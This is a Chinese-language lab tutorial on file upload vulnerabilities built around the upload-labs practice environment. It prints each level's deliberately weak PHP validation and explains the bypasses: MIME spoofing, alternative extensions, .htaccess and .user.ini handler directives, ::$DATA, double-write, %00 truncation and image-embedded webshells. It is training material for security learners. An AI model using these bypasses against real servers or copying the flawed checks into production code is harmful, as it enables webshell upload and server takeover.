# ⽂件上传

## **1**.⽂件上传漏洞定义

⽤户通过⽂件上传的功能模块进⾏⽂件上传时，如果服务端没有对上传⽂件进⾏严格的验证和过滤，⽽导致的⽤户可以越过其本身权限向服务器上上传可执⾏的动态脚本⽂件。则攻击888者可以通过上传⽊⻢，webshell等恶意⽂件，经过web容器进⾏解析，对服务器进⾏攻击造成伤害，叫⽂件上传漏洞。

## **2**.漏洞产⽣原因：

1. 没有对上传⽂件进⾏严格安全校验
2. 服务器配置不当
3. 过滤不严格
4. 没有对上传⽂件进⾏限制
5. 中间件等存在解析漏洞
6. 本地⽂件上传限制被绕过
7. ⽂件路径截断

## **3**.漏洞危害：

1. 上传web脚本语⾔，经过服务器的web容器解析并执⾏可导致远程代码执⾏。
2. 上传⽂件是Flash的策略⽂件 crossdomain.xml，⿊客⽤以控制Flash在该域下的⾏为(其他通过类似⽅式控制策略⽂件的情况类似)。

3. 上传⽂件是病毒、⽊⻢⽂件，诱骗⽤户或者管理员下载执⾏，进⾏挖矿等。
4. 上传⽂件是钓⻥图⽚或包含了脚本的图⽚，进⾏钓⻥和欺诈。
5. 不常⻅的利⽤⽅法，以⽂件上传为⼊⼝，上传⼀个包含php脚本的合法的⽂本⽂件，在利⽤本地⽂件包含漏洞(Local File Include)执⾏此脚本。

## **4**.⽂件上传流程：

1. 客户端---->表单上传---->服务器接收上传信息---->存储为临时⽂件---->服务器对上传⽂件进⾏安全性处理（通过PHP代码的指导进⾏⽂件安全性检测）---->重命名---->转存为正式⽂件，不合格删除

2. 客户端---->表单上传---->服务器接收上传信息---->将⽂件存储在服务器固定路径---->对⽂件进⾏检测---->合格保留，不合格对⽂件进⾏删除，对上传者进⾏提示

## 5.漏洞绕过⽅式（upload_labs）：

### 相关⼯具及环境部署

#### 1.实验⼯具：

- PHPstudy
- upload-labs 项⽬地址：https://github.com/c0ny1/upload-labs
- upload-labs-writeup 项⽬地址：https://github.com/LandGrey/upload-labs-writeup
- Burpsuite 
- webshell管理⼯具
- ⼀句话⽊⻢

#### 2.环境部署：

项⽬地址：https://github.com/c0ny1/upload-labs

1. 1.下载解压到`PHPstudy`的`www`下
2. 2.更改⽂件名为`upload`
3. 3.输⼊项⽬路径，进⾏访问

### **1**.前端绕过

 **Pass-01 JS 校验**

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}

```



#### 1.插件禁⽤

`Script Blocker Ultimate`

#### 2.浏览器设置禁⽤

`F12-F1` 

#### 3.⼿动修改前端js代码进⾏绕过

右击-查看⻚⾯源代码-ctrl F进⾏位置定位-修改JavaScript函数

> #### form表单
>
> ##### enctype属性 
>
> （只有`method= "post"`时才使⽤post属性）：表明数据提交格式，规定将表单数据发送到服务器之前，如何对数据进⾏编码。
>
> ###### 语法
>
> ```js
> <form enctype= "value">
> ```
>
> ###### 属性值
>
> ![image-20240830103401594](https://image.201068.xyz/assets/26.文件上传/image-20240830103401594.png)
>
> ##### method属性
>
> 规定表单提交数据⽅式，如POST,GET
>
> ##### onsubmit属性
>
> （只再提交表单时触发）： 当提交表单时执⾏⼀段 JavaScript脚本
>
> ###### 语法：
>
> ```js
> <form onsubmit= "script">
> ```
>
> ###### 属性值
>
> ![image-20240830103422505](https://image.201068.xyz/assets/26.文件上传/image-20240830103422505.png)



#### 4.通过BurpSuite,进⾏后缀名绕过

1. 1.进⾏后缀名更改
2. 2.send发送数据包，进⾏查验，显示成功。可以进⾏后续渗透等操作

### **2**.后端绕过

后端校验由开发决定检测⽅式检测内容，是检测⽂件后缀，还是⽂件内容

#### **1**.⽂件类型绕过 （Content-Type）

**Pass-02 文件类型校验(MIME 校验)**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}

```



##### MIME 类型

###### 1.定义：

MIME类型是设定某种扩展名的⽂件⽤⼀种应⽤程序来打开的⽅式类型，当该扩展名⽂件被访问的时候，浏览器会⾃动使⽤指定应⽤程序来打开。

多⽤于指定⼀些客户端⾃定义的⽂件名，以及⼀些媒体⽂件打开⽅式。

MIME 消息能包含⽂本、图像、⾳频、视频以及其他应⽤程序专⽤的数据。

###### 2.语法：

`type/subtype`

###### 3.参数：

type 表示可以被分多个⼦类的独⽴类别，subtype 表示细分后的每个类型

###### 4.注意：

`/`左右⽆空格，MIME类型对⼤⼩写不敏感，但⼤部分都是⼩写

###### 5.默认MIME类型：

- text/plain 表示⽂本⽂件的默认值。
- application/octet-stream 表示所有其他情况的默认值。

###### 6.常⻅的 MIME 类型

- 超⽂本标记语⾔ `.html`：text/html
- 普通⽂本 `.txt`： text/plain
- RTF ⽂本 `.rtf`： application/rtf
- GIF 图形 `.gif`： image/gif image/png
- JPEG 图形 `.jpeg、.jpg`： image/jpeg
- au 声⾳⽂件 `.au`： audio/basic
- MIDI ⾳乐⽂件 `mid、.midi`： audio/midi、audio/x-midi
- RealAudio ⾳乐⽂件 `.ra、.ram`： audio/x-pn-realaudio
- MPEG ⽂件 `.mpg、.mpeg`： video/mpeg
- AVI ⽂件 `.avi`： video/x-msvideo
- GZIP ⽂件 `.gz`： application/x-gzip
- TAR ⽂件 `.tar`： application/x-tar

##### 步骤

1. a. 上传 .PHP ⽂件到服务器
2. b. 上传⽂件并使⽤ Burp Suite 捕获请求
3. c. 修改MMIE类型，将内容类型也更改为由application/php更改为image/jpeg
4. d. 转发请求,发包上传
5. e. 进⾏访问验证

#### **2**.⿊名单绕过

##### ⿊⽩名单

###### 1、⿊⽩名单机制：

- ⿊名单：⿊名单中⽂件不允许通过
- ⽩名单：⽩名单中⽂件允许通过

###### 2、⿊⽩名单判断

`sfahkfhakj`随便打⼀串后缀，**⿊名单不回拦截**，但⽩名单不允许上传

###### 3、具体绕过⽅式

##### **1**.同解析后缀名

**Pass-03 文件名后缀校验(黑名单绕过)**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

通过程序⾃身过滤机制，过滤不严谨。

有许多后缀不为PHP，但仍会默认被解析为PHP的后缀扩展名列表。类似于**曾⽤名**

- ⿊名单中：`php`
- ⽩名单中：`php3` 

##### **2**.`.htaccess`⽂件绕过

**Pass-04 文件名后缀校验（配置文件解析控制）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```



###### 1.定义：

`.htaccess`⽂件(Hypertext Access）超⽂本⼊⼝。本质为Apache配置⽂件，提供了针对⽬录改变配置的⽅法，在⼀个特定的⽂档⽬录中放置⼀个包含⼀个或多个指令的⽂件， 以作⽤于此⽬录及其所有⼦⽬录，管理相关⽬录下的⽹⻚配置。

###### 2.使⽤.htaccess限制条件

1.Apache环境

2.允许.htaccess⽂件使⽤，httpd.conf配置⽂件中`AllowOverride`参数设置为All。

修改后需对Apache进⾏重启

`httpd.conf`⽂件路径：

```
phpstudy_pro\Extensions\Apache2.4.39\conf\httpd.conf
```

指明Apache服务器是否去找.htacess⽂件作为配置⽂件，

如果设置为none,那么服务器将忽略.htacess⽂件，

如果设置为All,那么所有在.htaccess⽂件⾥有的指令都将被重写。

###### 3..htaccess功能

⽬标开启.htaccess并且上传⿊名单没有限制.htaccess⽂件，先上传.htaccess⽂件，对⽬标环境的⽬录进⾏相关配置，在上传图⽚，使图⽚的 PHP 恶意代码得以被直接解析执⾏。 

a.访问控制： 限制⽤户访问⽬录或⽂件。 

b.重定向： 重定向(Redirect)就是通过各种⽅法将各种⽹络请求重新定个⽅向转到其它位置（如：⽹⻚重定向、域名的重定向、路由选择的变化也是对数据报⽂经由路径的⼀种重定向）。

> 状态码：3开头
>
> 服务器请求状态码：
>
> ![image-20240830110816295](https://image.201068.xyz/assets/26.文件上传/image-20240830110816295.png)
>
> 状态码响应类别的的定义是必须遵守的，后⾯的两个数字服务器⾃⼰DIY也没什么问题

```bash
Redirect /upload/ http://www.yourdomain.com/index.html
//访问upload⽬录会重定向到你域名下的index⻚⾯
```

c.设置处理器`SetHandler`： SetHandler指令可以强制所有匹配的⽂件被⼀个指定的处理器处理。 

```bash
SetHandler application/x-httpd-php 
//当前⽬录以及⼦⽬录所有⽂件将会被当作php解析。
```

d.`AddType`： 将给定的⽂件扩展名映射到指定的内容类型。 

```bash
AddType application/x-httpd-php .png
//png为后缀的⽂件当作php⽂件解析。
```

e.⾃定义错误回显⻚⾯

```
ErrorDocument 404 /error_pages/404.html
 //Apache服务器在发⽣404的时候显示/error_pages/404html。⾃定义出错⻚⾯
```

创建.htaccess⽂件可能出现问题：

1.Windows 不能修改**⽂件名为空**

解决：使⽤`ren`命令

步骤：

```bash
ren 1.txt .htaccess //把1.txt 修改为.htaccess⽂件
```

###### 4.具体绕过步骤

1.编写.htaccess⽂件内容，进⾏上传

```bash
<FilesMatch '2.png'>
	SetHandler application/x-httpd-php
</FilesMatch>


<IfModule mime_module>
	AddHandler php5-script .png
	SetHandler application/x-httpd-php
</IfModule>
```

2.上传图⽚⻢或其他⽂件等

3.上传图⽚后进⾏查看

###### 5.防御措施

1. a：禁⽤ 户上传.htaccess⽂件
2. b：忽略.htaccess⽂件
3. c：编辑apache配置⽂件
4. d：修改`AllowOverride`的值为`None`，表示忽略.htaccess⽂件⼤⼩写绕过⿊名单机制，可以⽤bp 辅助进⾏fuzz测试。配合后缀，到intruder⾥进⾏爆破 

##### 2.1. `.user.ini`配置文件

**Pass-05 文件名后缀校验（配置文件解析控制）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

上传文件 **.user.ini**

```
auto_prepend_file=2.jpg
```

再上传一个内容为 php 一句话脚本，命名为 2.jpg。

`.user.ini` 文件作用：

所有的 php 文件都自动包含 `2.jpg` 文件。

![image-20240831102649880](https://image.201068.xyz/assets/26.文件上传/image-20240831102649880.png)



php 7.0修改`php.ini`

```
user_ini.cache_ttl = 10
```

![image-20240831102540282](https://image.201068.xyz/assets/26.文件上传/image-20240831102540282.png)



##### **3**.后缀⼤⼩写绕过

**Pass-06文件名后缀校验（大小写绕过）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

`.Php`

1.⼤⼩写绕过⿊名单机制，可以⽤bp 辅助进⾏fuzz测试。配合后缀，到intruder⾥进⾏爆破 

```
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
```

2.具体绕过步骤

先上传图⽚，⽤bp抓包修改后缀名，发送到intruder模块，对⽂件后缀位置进⾏后缀名爆破

##### **4**.⽂件后缀名（空格） “. ”“_” 绕过

**Pass-07文件名后缀校验（空格绕过）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

`.php空格 ` 

**Pass-08文件名后缀校验（点号绕过）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

`.php.`

将后缀名修改为`php_`

##### **5**.Windows⽂件流绕过 ::$DATA

###### **Pass-09 文件名后缀校验（::$DATA绕过）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```



###### 1.定义：

⽂件流 (本地⽂件系统) `::$DATA` (Windows⽂件流绕过)(这⾥利⽤到了NTFS交换教据流(ADS) ，ADS是NTFS磁盘格式的⼀个特性, 在NTFS⽂件系统下, 每个⽂件都可以存在多个数据流。简单理解,就是其它⽂件可以“寄宿”在某个⽂件身上，⽽在资源管理器中却只能看到宿主⽂件，不到寄宿⽂件。

###### 2.限制条件

只有Windows下可以使⽤

###### 3.利⽤⽂件流藏⽂件⽅法

> echo 123 > 39.txt 		//将123写⼊39.txt⽂件
>
> echo 123 > 39.txt:a.txt 	//将123内容隐藏在⽂件a.txt中
>
> 
>
> ⽂件读取：
>
> notepad 39.txt:a.txt 	 //可以通过notepad来对隐藏⽂件流进⾏读取
>
> 
>
> 当我们在磁盘上创建⽂件时，实际上的默认创建流程是加了:$DATA
>
> echo 123 > a.txt::$DATA	
>
> => echo 123 > a.txt
>
> 本质上他俩⼀样，但对于⿊⽩名单来说，他俩不⼀样
>

###### 4.绕过步骤：

⽐如上传1.php通过抓包，在后⾯加`::$DATA`进⾏绕过

```
1.php::$DATA
```

上传到服务器后，⽂件末尾会⾃动省略掉`::$DATA`后缀,所以访问时，要把后⾯⽂件流去掉，直接输⼊⽂件名

##### **6**.双写绕过

###### **Pass-11文件名后缀校验（双写绕过）**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

###### 涉及相关代码

> trim()
>
> 1.功能： `trim()` 函数移除字符串两侧的空⽩字符或其他预定义字符。 
>
> 2.语法：`trim(*string*,*charlist*)`
>
> 3.参数：
>
> ![image-20240831112636542](https://image.201068.xyz/assets/26.文件上传/image-20240831112636542.png)
>
> 4.示例：
>
> //移除字符串两侧的字符（"Hello" 中的 "He" 以及 "World" 中的 "d!"）
>
> ![image-20240831112657265](https://image.201068.xyz/assets/26.文件上传/image-20240831112657265.png)
>
> 输出： 
>
> Hello World!
>
> llo Worl 
>
> 
>
> `$file_name = trim($_FILES['upload_file']['name']);` 	//删除⽂件名两侧空字符

绕过：双写绕过

`str_ireplace();`函数会将敏感⽂件名替换为空。且代码中并未出现递归。如`1.pphphp`,其中php替换为空，剩1.php



###### **Pass-10 文件名后缀校验（拼接绕过）**

漏洞描述：将文件名进行过滤操作后，将文件名拼接在路径后面，所以需要绕

过前面的首尾去空以及去点。

利用方法：上传文件名为 .php. .(点+php+点+空格+点)

#### **3**.⽩名单绕过、%**00**和**00**截断：

###### **Pass-12 白名单校验（GET型0x00截断）**

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}

```

###### **Pass-13 白名单校验（POST型0x00截断）**

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}

```



##### 1.%00和00截断定义：

在url中%00表示ascll码中的0 ，⽽ascii中0作为特殊字符保留，所以当url中出现%00时就会认为读取已结束。等同于结束符。

##### 2.限制条件：

1. （1） `php<5.3.4`

2. （2）`php.ini`中：`magic_quotes_gpc`参数设置为`OFF`


##### 3.分类：

###### （1）get cookie型%00截断：

get cookie传参会经过url解码，所以可以通过直接在⽂件名后缀位置加上`%00`进⾏截断

> ### 涉及相关代码
>
> #### （1） move_uploaded_file() 
>
> 1.功能： 将上传的⽂件移动到新位置 
>
> 2.语法：`move_uploaded_file(file,newloc)`
>
> 3.参数：
>
> ![image-20240831113345783](https://image.201068.xyz/assets/26.文件上传/image-20240831113345783.png)
>
> 4.示例：
>
> ```bash
> move_uploaded_file($temp_file,$img_path)	//将⽂件从temp临时⽂件移到img图⽚路径
> ```
>
> #### （2）substr()
>
> 1.功能： 函数返回字符串的⼀部分 
>
> 2.语法：`substr(string,start,length)`
>
> 3.参数：
>
> ![image-20240831113402003](https://image.201068.xyz/assets/26.文件上传/image-20240831113402003.png)
>
> 4.示例
>
> ![image-20240831113415642](https://image.201068.xyz/assets/26.文件上传/image-20240831113415642.png)
>
> #### （3）strrpos()
>
> 1.功能：
>
> 查找字符串在另⼀字符串中最后⼀次出现的位置 
>
> 2.语法：`strrpos(string,find,start)`
>
> 3.参数：
>
> ![image-20240831113429140](https://image.201068.xyz/assets/26.文件上传/image-20240831113429140.png)
>
> 4.示例
>
> ![image-20240831113436468](https://image.201068.xyz/assets/26.文件上传/image-20240831113436468.png)



###### （2）post型00截断：

post传参不会经过解码，需要进⾏⼿动解码，通过bp的hex修改数据包

步骤：00截断绕过，上传时上传a.php，抓包在php后添加⼀个任意字符修改其`HEX`值为`00`，这样解析之后就是a.php了，也绕过了⿊名单

然后打开`hex`修改

#### **4**.检测⽂件内容

> 解析漏洞定义：
>
> 控制⽂件是否被当做后端脚本处理
>

##### **1**.图⽚⻢绕过

###### **Pass-14 文件内容检测（文件头校验）**

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

###### **Pass-15 文件内容检测 （getimagesize()校验）**

通过 `getimagesize()`获取上传文件信息，图片马绕过

`getimagesize()` 函数用于获取图像大小及相关信息，成功返回一个数组

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}

```

###### **Pass-16 文件内容检测 （exif_imagetype()绕过）**

`exif_imagetype()`获取图片类型

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}

```



###### 1.图⽚⻢

在图⽚中包含⼀句话⽊⻢。配合其他解析漏洞.htaccess等，对图⽚⻢进⾏解析，执⾏其中代码。优势：可以绕过好多防护机制。

###### 2.图⽚⻢制作

(1)⽤photoshop，⽂件-->⽂件简介-->在⽂档标题或者作者处写⼊⼀句话⽊⻢

(2)使⽤命令

```cmd
